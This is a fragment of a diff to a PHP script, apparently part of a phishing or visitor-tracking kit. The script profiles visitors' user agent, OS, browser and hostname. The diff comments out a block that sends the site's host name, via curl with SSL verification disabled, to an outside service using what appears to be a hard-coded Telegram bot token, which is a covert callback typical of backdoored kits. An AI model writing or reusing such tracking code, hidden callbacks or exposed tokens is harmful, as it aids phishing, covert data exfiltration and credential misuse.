@@ -90,7 +90,7 @@ $useragentss = $_SERVER['HTTP_USER_AGENT'];
 $oss = getOS($useragentss);
 $browser = getBrowser($useragentss);
 
-
+/*
 $ddd = $_SERVER['HTTP_HOST'];
 $content = "Host: https://ss".$ddd." [".$adder."]";
 $tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
@@ -108,6 +108,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
+*/
 
 
 $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
